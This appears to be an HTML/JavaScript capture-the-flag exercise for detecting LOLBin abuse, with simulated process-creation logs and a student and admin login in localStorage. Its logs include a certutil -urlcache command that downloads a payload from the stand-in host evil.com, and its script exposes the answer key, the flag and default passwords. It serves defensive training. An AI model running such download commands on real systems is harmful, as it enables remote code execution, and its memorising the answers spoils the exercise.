<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CTF: Hunt for LOLBins | Process Creation Logs</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Fira Code', system-ui, monospace;
    }
    body {
      background: linear-gradient(160deg, #0d1117 0%, #161b22 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      margin: 0;
    }
    .container {
      max-width: 1150px;
      width: 100%;
      background: rgba(22, 27, 34, 0.9);
      backdrop-filter: blur(28px);
      border: 1px solid rgba(0, 255, 128, 0.25);
      box-shadow: 0 25px 50px rgba(0, 200, 100, 0.15);
      border-radius: 2.8rem;
      padding: 2rem;
      color: #c9d9f0;
      transition: all 0.3s ease;
    }
    h1 {
      font-size: 2.3rem;
      font-weight: 700;
      text-align: center;
      background: linear-gradient(135deg, #3dfc8c, #1ca350);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 0.4rem;
      letter-spacing: 1px;
    }
    .subtitle {
      text-align: center;
      color: #8baac4;
      margin-bottom: 1.8rem;
      border-bottom: 1px dashed #2d3b4a;
      padding-bottom: 1rem;
      font-style: italic;
    }
    .panel {
      background: rgba(13, 17, 23, 0.8);
      backdrop-filter: blur(12px);
      border-radius: 1.8rem;
      padding: 1.7rem;
      border: 1px solid #2d405b;
      margin-bottom: 1.8rem;
    }
    .hidden {
      display: none !important;
    }
    .flex-row {
      display: flex;
      gap: 1.2rem;
      flex-wrap: wrap;
      align-items: center;
    }
    input, button {
      background: #0d1a26;
      border: 1px solid #345236;
      border-radius: 2rem;
      padding: 0.7rem 1.3rem;
      color: #d4f0e0;
      font-weight: 500;
      outline: none;
      transition: 0.2s;
      font-size: 0.9rem;
    }
    input:focus {
      border-color: #2ee67e;
      box-shadow: 0 0 14px #1db954;
    }
    button {
      background: #1a3328;
      border-color: #2ea85a;
      cursor: pointer;
      font-weight: bold;
      display: inline-flex;
      align-items: center;
      gap: 0.3rem;
    }
    button:hover {
      background: #234d38;
      border-color: #5cff9e;
      box-shadow: 0 0 18px #28a745;
    }
    .task-card {
      background: #0b1219;
      border-left: 6px solid #28a745;
      padding: 1.2rem;
      border-radius: 1.3rem;
      margin: 1.2rem 0;
      animation: fadeSlide 0.35s ease;
    }
    @keyframes fadeSlide {
      0% { opacity: 0; transform: translateY(8px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    .log-line {
      background: #02070e;
      border: 1px solid #1f3344;
      padding: 0.5rem 1rem;
      border-radius: 0.6rem;
      margin: 0.4rem 0;
      font-family: 'Fira Code', monospace;
      font-size: 0.78rem;
      white-space: pre-wrap;
      color: #bdd4ff;
    }
    .badge {
      background: #1f3a2f;
      padding: 0.2rem 0.9rem;
      border-radius: 20px;
      font-size: 0.8rem;
    }
    .process-tree {
      background: #030a10;
      border: 1px solid #2c4a3a;
      border-radius: 1rem;
      padding: 1rem;
      margin: 1rem 0;
      font-family: monospace;
      white-space: pre;
      color: #a5d6b8;
      overflow-x: auto;
    }
    .flag-box {
      background: #0b1f15;
      border: 2px dashed #3dfc8c;
      padding: 0.9rem;
      border-radius: 20px;
      text-align: center;
      font-weight: bold;
      font-size: 1.4rem;
      letter-spacing: 3px;
      color: #7effa1;
      animation: glowPulse 1.7s infinite;
    }
    @keyframes glowPulse {
      0% { box-shadow: 0 0 5px #1db954; }
      50% { box-shadow: 0 0 28px #0f9b4a; }
      100% { box-shadow: 0 0 5px #1db954; }
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 0.8rem;
    }
    th {
      text-align: left;
      color: #71d89b;
      border-bottom: 1px solid #2d4a3b;
      padding: 0.4rem;
    }
    td {
      padding: 0.4rem;
      border-bottom: 1px solid #1a2b22;
    }
    .status-indicator {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 6px;
    }
    .toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #1a3328;
      border: 1px solid #2ea85a;
      padding: 1rem 1.5rem;
      border-radius: 2rem;
      color: #7effa1;
      font-weight: bold;
      z-index: 9999;
      animation: slideIn 0.3s ease, fadeOut 0.3s 2.5s forwards;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }
    @keyframes slideIn {
      from { transform: translateX(100px); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    @keyframes fadeOut {
      to { opacity: 0; transform: translateY(-10px); }
    }
  </style>
</head>
<body>
<div class="container" id="appContainer">
  <div id="loginSection">
    <h1>🕵️ LOLBIN HUNTER</h1>
    <div class="subtitle">Living-off-the-Land Binaries · Process Creation Analysis</div>
    <div class="panel">
      <div class="flex-row" style="justify-content: center;">
        <button id="studentLoginBtn">🎓 Student Access</button>
        <button id="adminLoginBtn">🛡️ Admin Panel</button>
      </div>
      <div id="studentLoginForm" class="hidden" style="margin-top:1.6rem; text-align:center;">
        <input type="text" id="studentNameInput" placeholder="Your full name" autocomplete="off" style="width:70%;">
        <input type="password" id="studentPassInput" placeholder="Student batch password" style="width:70%; margin-top:0.7rem;">
        <button id="studentSubmitLogin" style="margin-top:0.8rem;">🔐 Enter CTF</button>
        <p style="font-size:0.8rem; color:#8ba0bc; margin-top:0.5rem;">Default password: <code style="background:#0d1a26; padding:0.2rem 0.5rem; border-radius:12px;">lolbin2025</code></p>
      </div>
      <div id="adminLoginForm" class="hidden" style="margin-top:1.6rem; text-align:center;">
        <input type="password" id="adminPassInput" placeholder="Admin password">
        <button id="adminSubmitLogin" style="margin-top:0.8rem;">🔑 Admin Login</button>
        <p style="font-size:0.8rem; color:#8ba0bc; margin-top:0.5rem;">Default admin: <code style="background:#0d1a26; padding:0.2rem 0.5rem; border-radius:12px;">admin123</code></p>
      </div>
    </div>
  </div>

  <div id="studentDashboard" class="hidden">
    <div style="display:flex; justify-content:space-between; align-items:center;">
      <h2 style="color:#5cf08b;">👤 <span id="displayStudentName"></span></h2>
      <button id="logoutStudentBtn">🚪 Logout</button>
    </div>
    <div id="taskContainer"></div>
  </div>

  <div id="adminDashboard" class="hidden">
    <div style="display:flex; justify-content:space-between;">
      <h2>🛡️ ADMINISTRATOR</h2>
      <button id="logoutAdminBtn">Exit</button>
    </div>
    <div class="panel">
      <h3>🔐 Student Batch Password</h3>
      <p style="font-size:0.8rem; color:#8baac4; margin-bottom:0.5rem;">Current: <code id="currentStudentPassDisplay" style="background:#0d1a26; padding:0.2rem 0.6rem; border-radius:12px;"></code></p>
      <div class="flex-row">
        <input type="text" id="newStudentPassword" placeholder="New student password">
        <button id="updateStudentPasswordBtn">Update</button>
      </div>
      <hr style="border-color:#2d4a3b; margin:1.2rem 0;">
      <h3>🔑 Change Admin Password</h3>
      <p style="font-size:0.8rem; color:#8baac4; margin-bottom:0.5rem;">Current: <code id="currentAdminPassDisplay" style="background:#0d1a26; padding:0.2rem 0.6rem; border-radius:12px;"></code></p>
      <div class="flex-row">
        <input type="password" id="newAdminPassword" placeholder="New admin password">
        <button id="updateAdminPasswordBtn">Update</button>
      </div>
      <hr style="border-color:#2d4a3b; margin:1.2rem 0;">
      <h3>📋 Student Progress</h3>
      <div id="adminStudentList"></div>
      <button id="resetAllProgressBtn" style="background:#3a1a1a; border-color:#aa3030; margin-top:1rem;">⚠️ Reset All Student Progress</button>
    </div>
  </div>
</div>

<script>
  (function() {
    // ============ STORAGE KEYS ============
    const ADMIN_PASS_KEY = 'lolbin_admin_pass_v2';
    const STUDENT_PASS_KEY = 'lolbin_student_pass_v2';
    const STUDENTS_DB_KEY = 'lolbin_students_db_v2';
    const INITIALIZED_KEY = 'lolbin_initialized_v2';

    // ============ DEFAULT VALUES ============
    const DEFAULT_ADMIN_PASS = 'admin123';
    const DEFAULT_STUDENT_PASS = 'lolbin2025';

    // ============ INITIALIZATION (runs once ever) ============
    function initializeStorage() {
      if (!localStorage.getItem(INITIALIZED_KEY)) {
        // First time setup - only if keys don't exist
        if (!localStorage.getItem(ADMIN_PASS_KEY)) {
          localStorage.setItem(ADMIN_PASS_KEY, DEFAULT_ADMIN_PASS);
        }
        if (!localStorage.getItem(STUDENT_PASS_KEY)) {
          localStorage.setItem(STUDENT_PASS_KEY, DEFAULT_STUDENT_PASS);
        }
        if (!localStorage.getItem(STUDENTS_DB_KEY)) {
          localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify([]));
        }
        localStorage.setItem(INITIALIZED_KEY, 'true');
      }
    }

    // Call initialization
    initializeStorage();

    // ============ STATE ============
    let currentUser = null;
    let adminActive = false;

    // ============ TASKS DEFINITION ============
    const tasks = [
      { id: 1, title: "📥 Task 1: LOLBin for Downloads", desc: "Which LOLBin is commonly used by attackers to download files from the internet? (executable name)", answer: "certutil" },
      { id: 2, title: "📊 Task 2: Anomalous Parent-Child", desc: "From process logs below, which parent process spawned PowerShell? (process name .exe)", answer: "excel.exe", extra: "procTree" },
      { id: 3, title: "🔍 Task 3: Suspicious Command Line", desc: "Find the command line that uses certutil with -urlcache flag. What is the target URL? (full URL)", answer: "http://evil.com/payload.exe", extra: "cmdLine" },
      { id: 4, title: "⚖️ Task 4: Legitimacy Check", desc: "Is there any legitimate admin script that uses certutil -urlcache in this environment? (yes/no)", answer: "no", extra: "legitimacy" },
      { id: 5, title: "🛡️ Task 5: Blocking Recommendation", desc: "What type of rule should block LOLBin abuse? (three words)", answer: "application whitelisting" }
    ];

    // ============ SIMULATED DATA ============
    const processEvents = [
      "Process Create: winword.exe (PID 4520) → cmd.exe (PID 4521)",
      "Process Create: excel.exe (PID 5580) → powershell.exe (PID 5581)",
      "Process Create: powershell.exe (PID 5581) → certutil.exe -urlcache -f http://evil.com/payload.exe C:\\Temp\\bad.exe",
      "Process Create: explorer.exe (PID 1200) → mshta.exe (PID 1201)",
      "Process Create: svchost.exe (PID 800) → legitimate_service.exe"
    ];

    const commandLines = [
      "certutil.exe -urlcache -f http://evil.com/payload.exe C:\\Temp\\bad.exe",
      "certutil.exe -encode input.txt output.txt",
      "mshta.exe javascript:alert('test')"
    ];

    // ============ HELPER FUNCTIONS ============
    function getStudents() { 
      try {
        return JSON.parse(localStorage.getItem(STUDENTS_DB_KEY) || '[]'); 
      } catch(e) {
        return [];
      }
    }
    
    function saveStudents(arr) { 
      localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify(arr)); 
    }
    
    function getStudentPassword() { 
      return localStorage.getItem(STUDENT_PASS_KEY) || DEFAULT_STUDENT_PASS; 
    }
    
    function getAdminPassword() { 
      return localStorage.getItem(ADMIN_PASS_KEY) || DEFAULT_ADMIN_PASS; 
    }

    function showToast(message, isError = false) {
      const existingToast = document.querySelector('.toast');
      if (existingToast) existingToast.remove();
      
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.style.background = isError ? '#3a1a1a' : '#1a3328';
      toast.style.borderColor = isError ? '#aa3030' : '#2ea85a';
      toast.style.color = isError ? '#ffaaaa' : '#7effa1';
      toast.textContent = message;
      document.body.appendChild(toast);
      
      setTimeout(() => {
        if (toast.parentNode) toast.remove();
      }, 3000);
    }

    function updateCompletion(name, taskId) {
      let students = getStudents();
      let s = students.find(s => s.name.toLowerCase() === name.toLowerCase());
      if (s && !s.completedTasks.includes(taskId)) {
        s.completedTasks.push(taskId);
        saveStudents(students);
        if (currentUser && currentUser.name.toLowerCase() === name.toLowerCase()) {
          currentUser.completedTasks = [...s.completedTasks];
        }
        return true;
      }
      return false;
    }

    // ============ RENDER FUNCTIONS ============
    function renderTasks() {
      if (!currentUser) return;
      document.getElementById('displayStudentName').innerText = currentUser.name;
      const container = document.getElementById('taskContainer');
      const completed = currentUser.completedTasks || [];
      
      let html = '<h3 style="margin-bottom:1rem;">🌳 Interactive Process Tree Visualization</h3>';
      
      // Process tree visualization with animation
      html += '<div class="process-tree" style="animation: fadeSlide 0.5s ease;">';
      html += '🖥️ SYSTEM PROCESS TREE (simulated live)\n';
      html += '├─ winword.exe (4520)\n│  └─ cmd.exe (4521)\n';
      html += '├─ <span style="color:#ff8888;">excel.exe (5580)</span> ⚠️\n';
      html += '│  └─ <span style="color:#ff6666;">powershell.exe (5581)</span> 🔴\n';
      html += '│     └─ <span style="color:#ff4444;">certutil.exe -urlcache ...</span> 💀\n';
      html += '├─ explorer.exe (1200)\n│  └─ mshta.exe (1201)\n';
      html += '└─ svchost.exe (800) [legitimate]\n';
      html += '</div>';
      html += '<p style="font-size:0.75rem; color:#8baac4; margin-bottom:1rem;">🔴 Red indicates suspicious parent-child relationship</p>';

      tasks.forEach(task => {
        const done = completed.includes(task.id);
        html += `<div class="task-card" style="border-left-color: ${done ? '#2ecc71' : '#28a745'}; animation-delay: ${task.id * 0.1}s;">`;
        html += `<strong>${task.title}</strong> <span class="badge">${done ? '✅ Complete' : '🔒 Pending'}</span>`;
        html += `<p style="margin:0.4rem 0;">${task.desc}</p>`;

        if (task.extra === 'procTree') {
          html += '<div class="log-line">📋 Process Creation Events (Sysmon Event 1):</div>';
          processEvents.forEach((e, i) => {
            const isSuspicious = e.includes('excel.exe') || e.includes('certutil');
            html += `<div class="log-line" style="${isSuspicious ? 'border-left: 3px solid #ff4444;' : ''}">${e}</div>`;
          });
        } else if (task.extra === 'cmdLine') {
          html += '<div class="log-line">📜 Captured Command Lines:</div>';
          commandLines.forEach(c => {
            const isMalicious = c.includes('urlcache') && c.includes('evil.com');
            html += `<div class="log-line" style="${isMalicious ? 'border-left: 3px solid #ff4444; background: #0a0305;' : ''}">${c}</div>`;
          });
        } else if (task.extra === 'legitimacy') {
          html += '<div class="log-line">📁 Admin Scripts Directory: C:\\Admin\\Scripts\\</div>';
          html += '<div class="log-line">📄 Contents: <span style="color:#ff8888;">(empty - no legitimate scripts found)</span></div>';
          html += '<div class="log-line">📅 Scheduled Tasks: None reference certutil -urlcache</div>';
          html += '<div class="log-line">👤 Recent User Activity: No IT admin logged in during incident window</div>';
        }

        if (!done) {
          html += `<div style="display:flex; gap:0.5rem; align-items:center; margin-top:0.5rem;">`;
          html += `<input type="text" id="answerInput${task.id}" placeholder="Your answer" style="flex:1;">`;
          html += `<button onclick="submitTask(${task.id})">✅ Submit</button>`;
          html += `</div>`;
        } else {
          html += `<p style="color:#9effb7; font-weight:bold;">✔ Task Completed Successfully</p>`;
        }
        html += '</div>';
      });

      if (completed.length === tasks.length) {
        html += '<div class="flag-box" style="animation: glowPulse 1.7s infinite, fadeSlide 0.5s ease;">';
        html += '🏆 FLAG{LOLBIN_DETECTED} 🏆';
        html += '</div>';
        html += '<p style="text-align:center; color:#5cf08b; margin-top:0.5rem;">🎉 Excellent investigation! All LOLBin hunting tasks completed.</p>';
      }
      
      container.innerHTML = html;
    }

    window.submitTask = function(taskId) {
      if (!currentUser) return;
      const input = document.getElementById(`answerInput${taskId}`);
      if (!input) return;
      const ans = input.value.trim();
      const task = tasks.find(t => t.id === taskId);
      if (!task) return;
      
      if (ans.toLowerCase() === task.answer.toLowerCase()) {
        const wasNew = updateCompletion(currentUser.name, taskId);
        if (wasNew) {
          showToast('✅ Correct! Task completed successfully.');
        } else {
          showToast('ℹ️ Task was already completed.');
        }
        renderTasks();
      } else {
        showToast('❌ Incorrect answer. Analyze the evidence more carefully.', true);
        // Shake animation on input
        input.style.animation = 'shake 0.5s ease';
        setTimeout(() => { input.style.animation = ''; }, 500);
      }
    };

    function renderAdminList() {
      const students = getStudents();
      const cont = document.getElementById('adminStudentList');
      if (!cont) return;
      
      // Update password displays
      document.getElementById('currentStudentPassDisplay').textContent = getStudentPassword();
      document.getElementById('currentAdminPassDisplay').textContent = getAdminPassword();
      
      if (students.length === 0) {
        cont.innerHTML = '<p style="color:#8baac4;">📭 No students have logged in yet.</p>';
        return;
      }
      
      let html = '<table><tr><th>Student Name</th><th>Tasks Completed</th><th>Progress</th><th>Status</th></tr>';
      students.forEach(s => {
        const cnt = (s.completedTasks || []).length;
        const percentage = Math.round((cnt / tasks.length) * 100);
        const statusColor = cnt === tasks.length ? '#2ecc71' : cnt > 0 ? '#f39c12' : '#e74c3c';
        html += `<tr>
          <td>${escapeHtml(s.name)}</td>
          <td>${cnt} / ${tasks.length}</td>
          <td>
            <div style="background:#0d1a26; border-radius:10px; height:8px; width:100px; overflow:hidden;">
              <div style="width:${percentage}%; height:100%; background:${statusColor}; transition: width 0.3s;"></div>
            </div>
          </td>
          <td><span class="status-indicator" style="background:${statusColor};"></span>${cnt === tasks.length ? 'Flag Obtained' : cnt > 0 ? 'In Progress' : 'Not Started'}</td>
        </tr>`;
      });
      html += '</table>';
      cont.innerHTML = html;
    }

    function escapeHtml(t) { 
      return String(t).replace(/[&<>"]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[m]); 
    }

    // ============ VIEW SWITCHING ============
    function showLogin() {
      document.getElementById('loginSection').classList.remove('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      document.getElementById('adminDashboard').classList.add('hidden');
      document.getElementById('studentLoginForm').classList.add('hidden');
      document.getElementById('adminLoginForm').classList.add('hidden');
      currentUser = null; 
      adminActive = false;
    }

    function showStudentDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.remove('hidden');
      document.getElementById('adminDashboard').classList.add('hidden');
      renderTasks();
    }

    function showAdminDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      document.getElementById('adminDashboard').classList.remove('hidden');
      renderAdminList();
    }

    // ============ EVENT LISTENERS ============
    document.addEventListener('DOMContentLoaded', ()=>{
      // Login buttons
      document.getElementById('studentLoginBtn').addEventListener('click', ()=>{
        document.getElementById('studentLoginForm').classList.remove('hidden');
        document.getElementById('adminLoginForm').classList.add('hidden');
      });
      
      document.getElementById('adminLoginBtn').addEventListener('click', ()=>{
        document.getElementById('adminLoginForm').classList.remove('hidden');
        document.getElementById('studentLoginForm').classList.add('hidden');
      });

      // Student login
      document.getElementById('studentSubmitLogin').addEventListener('click', ()=>{
        const name = document.getElementById('studentNameInput').value.trim();
        const pass = document.getElementById('studentPassInput').value.trim();
        
        if(!name || !pass) {
          showToast('Please enter both name and password.', true);
          return;
        }
        
        if(pass !== getStudentPassword()) {
          showToast('Invalid student batch password.', true);
          return;
        }
        
        let students = getStudents();
        let stu = students.find(s => s.name.toLowerCase() === name.toLowerCase());
        if(!stu) { 
          stu = {name, completedTasks: []}; 
          students.push(stu); 
          saveStudents(students);
          showToast(`Welcome, ${name}! New profile created.`);
        } else {
          showToast(`Welcome back, ${name}!`);
        }
        
        currentUser = {name: stu.name, completedTasks: [...stu.completedTasks]};
        document.getElementById('studentNameInput').value = '';
        document.getElementById('studentPassInput').value = '';
        showStudentDash();
      });

      // Admin login
      document.getElementById('adminSubmitLogin').addEventListener('click', ()=>{
        const pass = document.getElementById('adminPassInput').value.trim();
        if(pass === getAdminPassword()){
          adminActive = true; 
          document.getElementById('adminPassInput').value = ''; 
          showToast('Admin access granted.');
          showAdminDash();
        } else {
          showToast('Invalid admin password.', true);
        }
      });

      // Logout buttons
      document.getElementById('logoutStudentBtn').addEventListener('click', ()=>{
        showToast('Logged out successfully.');
        showLogin();
      });
      
      document.getElementById('logoutAdminBtn').addEventListener('click', ()=>{
        showToast('Admin logged out.');
        showLogin();
      });

      // Update student password
      document.getElementById('updateStudentPasswordBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        const np = document.getElementById('newStudentPassword').value.trim();
        if(!np) {
          showToast('Please enter a new password.', true);
          return;
        }
        localStorage.setItem(STUDENT_PASS_KEY, np);
        showToast('✅ Student password updated successfully!');
        document.getElementById('newStudentPassword').value = '';
        renderAdminList();
      });

      // Update admin password
      document.getElementById('updateAdminPasswordBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        const np = document.getElementById('newAdminPassword').value.trim();
        if(!np) {
          showToast('Please enter a new admin password.', true);
          return;
        }
        localStorage.setItem(ADMIN_PASS_KEY, np);
        showToast('✅ Admin password changed successfully!');
        document.getElementById('newAdminPassword').value = '';
        renderAdminList();
      });

      // Reset all progress
      document.getElementById('resetAllProgressBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        if (confirm('⚠️ Are you sure you want to reset ALL student progress? This cannot be undone.')) {
          saveStudents([]);
          showToast('All student progress has been reset.');
          renderAdminList();
        }
      });

      // Add shake animation style
      const style = document.createElement('style');
      style.textContent = `
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-10px); }
          75% { transform: translateX(10px); }
        }
      `;
      document.head.appendChild(style);

      // Initial view
      showLogin();
    });
  })();
</script>
</body>
</html>
